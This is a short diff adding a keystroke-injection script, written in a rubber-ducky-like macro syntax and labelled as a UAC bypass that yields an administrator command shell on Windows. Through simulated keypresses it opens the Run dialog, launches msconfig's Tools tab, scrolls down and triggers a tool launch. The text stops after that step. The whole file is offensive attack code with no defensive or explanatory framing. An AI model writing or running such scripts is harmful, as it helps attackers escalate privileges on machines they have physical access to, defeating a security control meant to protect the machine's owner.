@@ -1,0 +1,15 @@
+// UAC bypass (alt. method)
+// Gives admin cmd shell
+
+VAR: sleep_time, 1
+
+K: GUI, R
+SLEEP: {{sleep_time}}
+S: msconfig -5
+K: ENTER
+SLEEP: {{sleep_time}}
+LOOP: 14
+    K: DOWN_ARROW
+ELOOP
+K: LEFT_ALT, L
+SLEEP: {{sleep_time}}
